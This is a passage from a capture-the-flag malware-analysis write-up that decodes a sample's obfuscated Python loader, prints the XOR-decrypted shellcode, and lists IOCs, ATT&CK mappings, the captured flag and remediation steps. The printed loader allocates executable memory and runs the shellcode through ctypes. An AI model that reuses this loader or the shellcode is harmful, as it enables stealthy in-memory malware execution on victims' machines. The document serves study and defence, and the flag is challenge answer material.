<span class="token keyword">exec</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#g0emgoemboemoetmboemomeio</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Upon decoding the base64 data, the following code is found:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token keyword">import</span> ctypes

<span class="token keyword">def</span> <span class="token function">xor_decrypt</span><span class="token punctuation">(</span>ciphertext_bytes<span class="token punctuation">,</span> key_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
	decrypted_bytes <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	key_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>
	<span class="token keyword">for</span> i<span class="token punctuation">,</span> byte <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphertext_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
	decrypted_byte <span class="token operator">=</span> byte <span class="token operator">^</span> key_bytes<span class="token punctuation">[</span>i <span class="token operator">%</span> key_length<span class="token punctuation">]</span>
	decrypted_bytes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>decrypted_byte<span class="token punctuation">)</span>
	<span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>decrypted_bytes<span class="token punctuation">)</span>

shellcode <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>xor_decrypt<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='</span><span class="token punctuation">)</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>RtlMoveMemory<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
functype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CFUNCTYPE<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">)</span>
fn <span class="token operator">=</span> functype<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span>
fn<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Upon executing the xor_decrypt python function in <code>output.py</code> (E04) file, a bytearray is returned:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&amp;\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&amp;\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d&lt;$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3'</span><span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Converting the code to hex using the code below, the hex value is returned</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded">b <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
hex_str <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"HEX:"</span><span class="token punctuation">,</span> hex_str<span class="token punctuation">)</span>
<span class="token comment"># Returned Hex: 5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">After compiling  the hex code using an online <a data-tooltip-position="top" aria-label="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3&amp;arch=x86-32&amp;endianness=little&amp;baddr=0x00000000&amp;dis_with_addr=True&amp;dis_with_raw=True&amp;dis_with_ins=True#disassembly" rel="noopener nofollow" class="external-link is-unresolved" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3&amp;arch=x86-32&amp;endianness=little&amp;baddr=0x00000000&amp;dis_with_addr=True&amp;dis_with_raw=True&amp;dis_with_ins=True#disassembly" target="_self">x86/x64 Assembler &amp; Disassembler</a>, the returned instruction set was analyzed using Google Gemini. It was found that the shellcode sets up a memory stack, pushes obfuscated data onto the stack, loops over the stack using XOR to decode the stack. After decoding, the code copies the resulting string to the local variable space it allocated in step 1. To hide its activity, the shellcode overwrites the first&nbsp;<code>$0x40$</code>&nbsp;(64) bytes on the stack, including the area where the decoded string was originally stored, with the byte&nbsp;<code>$0x01$</code>. </p></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Indicators of Compromise (IOCs)" dir="auto" class="heading" id="Indicators_of_Compromise_(IOCs)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Indicators of Compromise (IOCs)</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span><strong>Files/Hashes:</strong> <code>5ce1c6674a96a060d0b3baa5f7d61f6d39bac2a9482a3ce470a4a8ccbef95b74</code></li>
<li data-line="1" dir="auto"><span class="list-bullet"></span><strong>Domains/IPs/URLs/URIs:</strong> <code>https://c35b74dc.proxy.coursestack.com:443/</code></li>
</ul></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="ATT&amp;CK Mapping" dir="auto" class="heading" id="ATT&amp;CK_Mapping_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>ATT&amp;CK Mapping</h2></div><div class="el-p"><p dir="auto">Map observed behaviors to ATT&amp;CK (IDs + names), e.g.:</p></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span><em>Initial Access</em> - <strong>T1189</strong> ‚Äì Drive by Compromise </li>
<li data-line="1" dir="auto"><span class="list-bullet"></span><em>Execution</em> - <strong>T1053.005</strong> ‚Äì Scheduled Task/Job:&nbsp;Scheduled Task</li>
<li data-line="2" dir="auto"><span class="list-bullet"></span><em>Persistence</em> - <strong>T1547.015</strong> ‚Äì Boot or Logon Autostart Execution:&nbsp;Login Items</li>
<li data-line="3" dir="auto"><span class="list-bullet"></span><em>Defense Evasion</em> - <strong>T1027.009</strong> ‚Äì Obfuscated Files or Information:&nbsp;Embedded Payloads</li>
<li data-line="4" dir="auto"><span class="list-bullet"></span><em>Defense Evasion</em> - <strong>T1027.013</strong> ‚Äì Obfuscated Files or Information:&nbsp;Encrypted/Encoded File</li>
<li data-line="5" dir="auto"><span class="list-bullet"></span><em>Defense Evasion</em> - <strong>T1055.001</strong> ‚Äì Process Injection:&nbsp;Dynamic-link Library Injection</li>
<li data-line="6" dir="auto"><span class="list-bullet"></span><em>Defense Evasion</em> - <strong>T1055.001</strong> ‚Äì Process Injection:&nbsp;Dynamic-link Library Injection</li>
</ul></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Findings &amp; Flags" dir="auto" class="heading" id="Findings_&amp;_Flags_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Findings &amp; Flags</h2></div><div class="el-p"><p dir="auto"><strong>Narrative Summary (Executive-style):</strong>  </p></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span>The website employed code that was able to covertly download a file containing computer instructions that bypassed security by obfuscating its instructions to set up a recurring service to be run on the exploited computer. A second-stage payload was also downloaded, disguised as a PDF file that contained the actual threatening code. The threatening code was run via a recurring service that was injected into the memory of the infected computer, allowing the malware to run without detection.</li>
</ul></div><div class="el-h3"><h3 data-heading="Captured Flags" dir="auto" class="heading" id="Captured_Flags_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Captured Flags</h3></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="" data-callout="flag" class="callout"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-flag"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg></div><div class="callout-title-inner">Flag</div></div><div class="callout-content">
<p dir="auto"><code>flag{d341b8d2c96e9cc96965afbf5675fc26}</code></p>
</div></div></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Remediation &amp; Recommendations" dir="auto" class="heading" id="Remediation_&amp;_Recommendations_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Remediation &amp; Recommendations</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span>Containment steps: Remove the infected devices from the network.</li>
<li data-line="1" dir="auto"><span class="list-bullet"></span>Eradication: Remove the related service from the device, and remove any code used to stage or execute the malware.</li>
<li data-line="2" dir="auto"><span class="list-bullet"></span>Hardening: Block the domain associated with the malware, report the file signature of the malware, and update systems (EDR, SEIM, etc.) to check for the related malware signature.</li>
</ul></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Lessons Learned" dir="auto" class="heading" id="Lessons_Learned_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Lessons Learned</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span>I learned that converting the bytearray into hex and then disassembling the shellcode provided the assembly instructions that revealed what the malware did</li>
</ul></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto"><strong>Disclaimer</strong><br>
For educational purposes only. Handle all evidence lawfully, preserve integrity, and follow the challenge‚Äôs ROE.</p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme-toggle-input" id=""><input class="theme-toggle-input" type="checkbox" id="theme-toggle-input"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="#üêû_Verify_You_Are_Human_0" data-path="#üêû_Verify_You_Are_Human_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="üêû Verify You Are Human">üêû Verify You Are Human</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Table_of_Contents_0" data-path="#Table_of_Contents_0"><div class="tree-item-inner heading-link" heading-name="Table of Contents">Table of Contents</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Case_Overview_0" data-path="#Case_Overview_0"><div class="tree-item-inner heading-link" heading-name="Case Overview">Case Overview</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Setup_0" data-path="#Setup_0"><div class="tree-item-inner heading-link" heading-name="Setup">Setup</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Evidence_Inventory_&amp;_Chain_of_Custody_0" data-path="#Evidence_Inventory_&amp;_Chain_of_Custody_0"><div class="tree-item-inner heading-link" heading-name="Evidence Inventory &amp; Chain of Custody">Evidence Inventory &amp; Chain of Custody</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="#Malware_Analysis_0" data-path="#Malware_Analysis_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Malware Analysis">Malware Analysis</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="#Static_Analysis_0" data-path="#Static_Analysis_0"><div class="tree-item-inner heading-link" heading-name="Static Analysis">Static Analysis</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Indicators_of_Compromise_(IOCs)_0" data-path="#Indicators_of_Compromise_(IOCs)_0"><div class="tree-item-inner heading-link" heading-name="Indicators of Compromise (IOCs)">Indicators of Compromise (IOCs)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#ATT&amp;CK_Mapping_0" data-path="#ATT&amp;CK_Mapping_0"><div class="tree-item-inner heading-link" heading-name="ATT&amp;CK Mapping">ATT&amp;CK Mapping</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="#Findings_&amp;_Flags_0" data-path="#Findings_&amp;_Flags_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Findings &amp; Flags">Findings &amp; Flags</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="#Captured_Flags_0" data-path="#Captured_Flags_0"><div class="tree-item-inner heading-link" heading-name="Captured Flags">Captured Flags</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Remediation_&amp;_Recommendations_0" data-path="#Remediation_&amp;_Recommendations_0"><div class="tree-item-inner heading-link" heading-name="Remediation &amp; Recommendations">Remediation &amp; Recommendations</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="#Lessons_Learned_0" data-path="#Lessons_Learned_0"><div class="tree-item-inner heading-link" heading-name="Lessons Learned">Lessons Learned</div></a><div class="tree-item-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>